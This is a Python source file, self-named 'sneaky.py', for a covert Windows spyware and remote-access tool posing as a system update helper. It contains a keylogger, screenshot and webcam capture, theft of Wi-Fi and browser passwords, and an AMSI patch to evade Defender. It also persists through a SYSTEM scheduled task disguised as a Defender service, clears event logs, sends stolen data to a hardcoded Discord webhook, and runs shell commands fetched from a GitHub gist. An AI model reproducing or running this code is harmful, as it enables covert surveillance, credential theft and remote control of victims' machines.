import os, sys, time, subprocess, socket, platform, getpass, shutil, sqlite3, json, requests, threading, random, string, glob, psutil, atexit, traceback
from datetime import datetime
try:
    import ctypes
    from ctypes import wintypes
except ImportError:
    ctypes = None
    sys.stderr.write("ctypes unavailable; some features may fail\n")
try:
    import winreg
    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, OpenKey, SetValueEx, QueryValueEx
except ImportError:
    winreg = None
    sys.stderr.write("winreg unavailable; some windows features will fail\n")
try:
    from PIL import ImageGrab
    import cv2
    from pynput.keyboard import Listener
    import win32gui
except ImportError as e:
    sys.stderr.write(f"critical import failed: {e}\n")
    sys.exit(1)

VERSION = "2.4.5"
TEMP_LOG = os.path.join(os.getenv("TEMP", "/tmp"), "system_update_helper.log")
PYTHON_VERSION = sys.version_info
IS_FSTRING = PYTHON_VERSION >= (3, 6)
DEBUG = True
IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0 if platform.system() == "Windows" and ctypes else True
IS_WINDOWS = platform.system() == "Windows"
HARVESTED_DATA = {}
keylog_buffer = []
keylog_file = os.path.join(os.getenv("TEMP", "/tmp"), "keylog.txt")
screenshot_mode = None
last_window = None
buffer_lock = threading.Lock()
file_lock = threading.Lock()
keylogger_stop = threading.Event()
camera_in_use = False
send_queue = []
send_lock = threading.Lock()

def log_debug(msg, *args, exc_info=None):
    msg = msg if not args else msg % args
    try:
        with open(TEMP_LOG, "a") as f:
            if exc_info:
                f.write(f"{datetime.now()} - debug - {msg} - stacktrace: {''.join(traceback.format_exception(*exc_info))}\n")
            else:
                f.write(f"{datetime.now()} - debug - {msg}\n")
    except Exception as e:
        sys.stderr.write(f"log failed: {e}\n")
    if DEBUG:
        sys.stderr.write(f"debug: {msg}\n")

log_debug("script started - v%s", VERSION)

def install_deps():
    log_debug("ensuring dependencies")
    pkgs = [
        ("pywin32", "pywin32>=306"),
        ("requests", "requests>=2.28.1"),
        ("psutil", "psutil>=5.9.0"),
        ("pynput", "pynput>=1.7.6"),
        ("pillow", "Pillow>=9.0.0"),
        ("opencv-python", "opencv-python>=4.5.5"),
        ("pycryptodome", "pycryptodome>=3.15.0")
    ]
    for dep, pkg in pkgs:
        try:
            __import__(dep)
            log_debug("%s installed", dep)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg])
                log_debug("installed %s via pip", pkg)
            except Exception as e:
                log_debug("pip failed for %s: %s", pkg, e, exc_info=sys.exc_info())
                return False
    return True

if not install_deps():
    log_debug("dependency install failed")
    sys.exit(1)
sys.stdout.write(f"[{datetime.now()}] *** running sneaky.py v{VERSION} *** - dependencies ok\n")

WEBHOOK_URL = "https://discord.com/api/webhooks/1345280507545649212/0G9L_YVWq0KuH7GStQUbvHBxiAk8a5Y7pViIqdwXJcfw1zNBq2peSSl_kCTPKiARPfD4"
HIDE_DIR = os.path.join(os.getenv("APPDATA", os.path.expanduser("~\\Application Data")), "systemutilities")
HIDE_FILE = os.path.join(HIDE_DIR, "system_update_helper.py")
PID_FILE = os.path.join(HIDE_DIR, ".autojug.pid")

def queue_for_send(data=None, file_path=None):
    with send_lock:
        send_queue.append((data, file_path))
    log_debug("queued data for send: file=%s, data_len=%s", file_path, len(data) if data else 'N/A')

def send_to_discord():
    global send_queue
    while not keylogger_stop.is_set():
        with send_lock:
            if not send_queue:
                time.sleep(5)
                continue
            data, file_path = send_queue.pop(0)
        if file_path and os.path.exists(file_path):
            file_size = os.path.getsize(file_path)
            if file_size > 8 * 1024 * 1024:
                log_debug("file %s exceeds 8MB: %d bytes", file_path, file_size)
                continue
            for _ in range(3):
                try:
                    with open(file_path, "rb") as f:
                        response = requests.post(WEBHOOK_URL, files={"file": f}, timeout=10)
                    if response.status_code == 200 or response.status_code == 204:
                        log_debug("file sent successfully: %s", file_path)
                    elif response.status_code == 429:
                        log_debug("rate limited by Discord, waiting 2 minutes")
                        time.sleep(120)
                        with send_lock:
                            send_queue.insert(0, (data, file_path))
                        break
                    else:
                        log_debug("file send failed with status %d: %s", response.status_code, response.text)
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    break
                except Exception as e:
                    log_debug("file send failed: %s", e, exc_info=sys.exc_info())
                    time.sleep(2)
        elif data:
            data_str = str(data)
            temp_file = os.path.join(os.getenv("TEMP", "/tmp"), f"data_{random_string()}.txt")
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(data_str)
            for _ in range(3):
                try:
                    with open(temp_file, "rb") as f:
                        response = requests.post(WEBHOOK_URL, files={"file": (os.path.basename(temp_file), f)}, timeout=10)
                    if response.status_code == 200 or response.status_code == 204:
                        log_debug("text data sent successfully as file: %s", temp_file)
                    elif response.status_code == 429:
                        log_debug("rate limited by Discord, waiting 2 minutes")
                        time.sleep(120)
                        with send_lock:
                            send_queue.insert(0, (data, None))
                        break
                    else:
                        log_debug("text send failed with status %d: %s", response.status_code, response.text)
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
                    break
                except Exception as e:
                    log_debug("text send failed: %s", e, exc_info=sys.exc_info())
                    time.sleep(2)
        time.sleep(30)

def manage_instance():
    log_debug("entering manage_instance")
    pid_exists = os.path.exists(PID_FILE)
    should_clean = not pid_exists
    if pid_exists:
        with open(PID_FILE, 'r') as f:
            pid_content = f.read().strip()
        if pid_content:
            pid = int(pid_content)
            current_pid = os.getpid()
            if pid == current_pid:
                pass
            elif psutil.pid_exists(pid):
                proc = psutil.Process(pid)
                if proc.name() == sys.executable.split('\\')[-1]:
                    raise RuntimeError(f"another instance running with pid {pid}")
                else:
                    should_clean = True
            else:
                should_clean = True
    os.makedirs(HIDE_DIR, exist_ok=True)
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))
    atexit.register(lambda: os.remove(PID_FILE) if os.path.exists(PID_FILE) else None)
    log_debug("pid managed for process %d", os.getpid())
    return should_clean

def persist():
    log_debug("setting persistence")
    if IS_WINDOWS and IS_ADMIN and winreg:
        cmd = f'schtasks /create /tn windowsdefenderhealthservice /tr "\"{sys.executable}\" \"{HIDE_FILE}\"" /sc ONSTART /ru SYSTEM /f'
        subprocess.run(cmd, shell=True)
    else:
        log_debug("no admin privileges or unsupported os; persistence limited")

def random_string(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def fake_updates():
    sys.stdout.write(f"[{datetime.now()}] v{VERSION} - updating system...\n")
    [time.sleep(0.3) for _ in range(3)]
    sys.stdout.write("update complete!\n")
    sys.stdout.flush()
    log_debug("fake updates done")

def bypass_defender():
    if IS_WINDOWS and ctypes and IS_ADMIN:
        try:
            amsi_dll = ctypes.windll.kernel32.GetModuleHandleA(b"amsi.dll")
            if amsi_dll:
                addr = ctypes.windll.kernel32.GetProcAddress(amsi_dll, b"AmsiScanBuffer")
                if addr:
                    old_protect = ctypes.c_uint32()
                    if ctypes.windll.kernel32.VirtualProtect(addr, 5, 0x40, ctypes.byref(old_protect)):
                        ctypes.memset(addr, 0xC3, 5)
                        log_debug("defender bypassed")
        except Exception as e:
            log_debug("bypass failed: %s", e, exc_info=sys.exc_info())

def keylogger():
    global keylog_buffer
    log_debug("keylogger started")
    line_buffer = []
    def send_keylog():
        while not keylogger_stop.is_set():
            with buffer_lock:
                if keylog_buffer:
                    with file_lock:
                        with open(keylog_file, "a", encoding="utf-8") as f:
                            f.write("\n".join(keylog_buffer) + "\n")
                        file_size = os.path.getsize(keylog_file)
                        if file_size > 3 * 1024 * 1024:
                            queue_for_send(file_path=keylog_file)
                            keylog_buffer.clear()
                            log_debug("keylog sent instantly: %d bytes", file_size)
                        elif random.randint(120, 180) <= time.time() % 180:
                            queue_for_send(file_path=keylog_file)
                            keylog_buffer.clear()
                            log_debug("keylog sent on timer")
            time.sleep(5)
    threading.Thread(target=send_keylog, daemon=True).start()
    def on_press(key):
        if keylogger_stop.is_set():
            return False
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow()) if IS_WINDOWS else "unknown"
        try:
            key_char = key.char if hasattr(key, 'char') and key.char else str(key)
            if key_char == " ":
                with buffer_lock:
                    keylog_buffer.append(f"{datetime.now()} - Line: {' '.join(line_buffer)} - Window: {window}")
                    log_debug("keylog line buffered: %s", ' '.join(line_buffer))
                line_buffer.clear()
            else:
                line_buffer.append(key_char)
                if len(line_buffer) >= 24:
                    with buffer_lock:
                        keylog_buffer.append(f"{datetime.now()} - Line: {' '.join(line_buffer)} - Window: {window}")
                        log_debug("keylog line buffered (max reached): %s", ' '.join(line_buffer))
                    line_buffer.clear()
        except AttributeError:
            pass
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        log_debug("keylogger error: %s", e, exc_info=sys.exc_info())
        queue_for_send(f"keylogger error: {e}")

def harvest_data(is_initial_harvest):
    global HARVESTED_DATA
    log_debug("harvesting data, initial=%s", is_initial_harvest)
    current_data = {
        "system": {
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "username": getpass.getuser()
        },
        "wifi": {},
        "creds": {
            "system": f"{getpass.getuser()}:{os.getenv('AUTOJUG_PASS', 'N/A')}",
            "browser": {}
        }
    }
    if IS_WINDOWS:
        try:
            profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode().splitlines()
            wifi_data = {}
            for line in profiles:
                if "All User Profile" in line:
                    profile_name = line.split("All User Profile")[1].strip()[2:]
                    key_output = subprocess.check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell=True).decode()
                    if "Key Content" in key_output:
                        password = key_output.split("Key Content")[1].strip().split("\r\n")[0].strip()
                        wifi_data[profile_name] = password
            current_data["wifi"] = wifi_data
        except Exception as e:
            log_debug("wifi harvest failed: %s", e, exc_info=sys.exc_info())
    if is_initial_harvest:
        try:
            chrome_db = os.path.join(os.getenv("APPDATA", ""), "..", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
            if os.path.exists(chrome_db):
                with sqlite3.connect(chrome_db) as conn:
                    cursor = conn.execute("SELECT origin_url, password_value FROM logins")
                    current_data["creds"]["browser"]["chrome"] = {row[0]: row[1] for row in cursor.fetchall()}
            firefox_db = glob.glob(os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles", "*", "logins.json"))
            if firefox_db and os.path.exists(firefox_db[0]):
                with open(firefox_db[0], "r") as f:
                    logins = json.load(f).get("logins", [])
                    current_data["creds"]["browser"]["firefox"] = {login["hostname"]: login["encryptedPassword"] for login in logins}
        except Exception as e:
            log_debug("browser creds harvest failed: %s", e, exc_info=sys.exc_info())
        HARVESTED_DATA = current_data.copy()
        queue_for_send(json.dumps(current_data))
    else:
        changes = {}
        for key in current_data:
            if key not in HARVESTED_DATA or current_data[key] != HARVESTED_DATA[key]:
                changes[key] = current_data[key]
        if changes:
            change_report = "changes detected:\n" + json.dumps(changes, indent=2)
            queue_for_send(change_report)
            HARVESTED_DATA.update(changes)
            log_debug("data changes queued, size=%d", len(change_report))

def periodic_harvest():
    log_debug("starting periodic harvest")
    while not keylogger_stop.is_set():
        harvest_data(False)
        time.sleep(random.randint(60, 180))

def clean_traces():
    log_debug("cleaning traces")
    if IS_WINDOWS and IS_ADMIN:
        [subprocess.run(cmd, shell=True) for cmd in ['wevtutil cl system', 'wevtutil cl security', 'wevtutil cl application']]

def check_camera_usage():
    global camera_in_use
    while not keylogger_stop.is_set():
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            camera_in_use = True
            log_debug("camera in use by another app")
        else:
            camera_in_use = False
            cap.release()
        time.sleep(5)

def selfie():
    log_debug("taking selfie")
    cap = None
    for _ in range(3):
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                raise Exception("camera not opened")
            start_time = time.time()
            ret, frame = cap.read()
            if not ret or (time.time() - start_time) > 5:
                raise Exception("failed to capture frame or timed out")
            temp_file = os.path.join(os.getenv("TEMP", "/tmp"), f"selfie_{random_string()}.jpg")
            cv2.imwrite(temp_file, frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
            log_debug("selfie written to %s", temp_file)
            queue_for_send(file_path=temp_file)
            break
        except Exception as e:
            log_debug("selfie attempt failed: %s", e, exc_info=sys.exc_info())
            queue_for_send(f"selfie error: {e}")
            time.sleep(1)
        finally:
            if cap and cap.isOpened():
                cap.release()

def sneaky_selfie_thread():
    log_debug("starting sneaky selfie thread")
    while not keylogger_stop.is_set():
        if camera_in_use:
            selfie()
            time.sleep(30)
        time.sleep(5)

def screenshot():
    global last_screenshot_time
    log_debug("taking screenshot")
    try:
        img = ImageGrab.grab()
        temp_file = os.path.join(os.getenv("TEMP", "/tmp"), f"screenshot_{random_string()}.png")
        img.save(temp_file, "PNG")
        queue_for_send(file_path=temp_file)
        last_screenshot_time = time.time()
    except Exception as e:
        log_debug("screenshot failed: %s", e, exc_info=sys.exc_info())
        queue_for_send(f"screenshot error: {e}")

def check_window_change():
    global last_window, last_screenshot_time
    current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow()) if IS_WINDOWS else "unknown"
    if current_window != last_window and screenshot_mode == "constant":
        screenshot()
        log_debug("screenshot on window change: %s", current_window)
    last_window = current_window

def main():
    global last_screenshot_time
    last_screenshot_time = time.time()
    log_debug("main starting")
    sys.excepthook = lambda exc_type, exc_value, exc_traceback: log_debug("uncaught exception: %s", exc_value, exc_info=(exc_type, exc_value, exc_traceback))
    sys.stdout.write(f"[{datetime.now()}] v{VERSION} - main started (admin: {IS_ADMIN})\n")
    if IS_WINDOWS and not DEBUG and ctypes:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    should_clean = manage_instance()
    if should_clean:
        clean_traces()
    bypass_defender()
    persist()
    fake_updates()
    harvest_data(True)
    threads = [
        threading.Thread(target=keylogger, daemon=True),
        threading.Thread(target=periodic_harvest, daemon=True),
        threading.Thread(target=check_camera_usage, daemon=True),
        threading.Thread(target=sneaky_selfie_thread, daemon=True),
        threading.Thread(target=send_to_discord, daemon=True)
    ]
    for t in threads:
        t.start()
        log_debug("started thread: %s", t.name)
    handler = CommandHandler()
    retry_delay = 1
    while True:
        try:
            handler.fetch_commands()
            check_window_change()
            if screenshot_mode == "periodic" and (time.time() - last_screenshot_time) > random.randint(60, 180):
                screenshot()
            time.sleep(random.randint(300, 900))
            retry_delay = 1
        except Exception as e:
            log_debug("main loop error: %s", e, exc_info=sys.exc_info())
            queue_for_send(f"loop error: {e}")
            time.sleep(retry_delay)
            retry_delay = min(retry_delay * 2, 60)

class CommandHandler:
    def __init__(self):
        self.executed = []
        self.fallback_urls = ["https://gist.github.com/jonhardwick-spec/6b171df6eacfad03119b1e1a98f85192/raw"]
        log_debug("commandhandler init")

    def fetch_commands(self):
        log_debug("fetching commands")
        for url in self.fallback_urls:
            try:
                resp = requests.get(url, timeout=5)
                log_debug("got raw response: %s", resp.text[:100])
                self.parse_commands(resp.text)
                break
            except Exception as e:
                log_debug("fetch failed: %s", e, exc_info=sys.exc_info())
                time.sleep(2)

    def parse_commands(self, data):
        global screenshot_mode
        try:
            if not data or data.isspace():
                log_debug("no command data to parse")
                return
            try:
                cmds = json.loads(data)
                for cmd in cmds:
                    action = cmd.get("action")
                    if action and action not in self.executed:
                        self.executed.append(action)
                        param = cmd.get("path") or cmd.get("command")
                        if action == "exfiltrate" and os.path.exists(param):
                            queue_for_send(file_path=param)
                        elif action == "execute":
                            result = subprocess.run(param, shell=True, capture_output=True, text=True)
                            queue_for_send(result.stdout if result else "command failed")
                        elif action == "/selfie":
                            selfie()
                        elif action == "/screenshot constant":
                            screenshot_mode = "constant"
                            log_debug("screenshot mode set to constant")
                        elif action == "/screenshot":
                            screenshot_mode = "periodic"
                            log_debug("screenshot mode set to periodic")
            except json.JSONDecodeError:
                commands = data.strip().split('\n')
                for cmd in commands:
                    cmd = cmd.strip()
                    if cmd and cmd not in self.executed:
                        if cmd == "/selfie":
                            selfie()
                            self.executed.append(cmd)
                        elif cmd == "/screenshot constant":
                            screenshot_mode = "constant"
                            self.executed.append(cmd)
                            log_debug("screenshot mode set to constant (plain text)")
                        elif cmd == "/screenshot":
                            screenshot_mode = "periodic"
                            self.executed.append(cmd)
                            log_debug("screenshot mode set to periodic (plain text)")
                        elif cmd == "/juggthatmf":
                            self.executed.append(cmd)
                            log_debug("juggthatmf command received - no action defined")
                        else:
                            log_debug("unknown plain text command: %s", cmd)
        except Exception as e:
            log_debug("parse failed: %s", e, exc_info=sys.exc_info())

if __name__ == "__main__":
    log_debug("entering __main__")
    try:
        main()
    except Exception as e:
        log_debug("main error: %s", e, exc_info=sys.exc_info())
        queue_for_send(f"error: {e}")
        keylogger_stop.set()
        os._exit(1)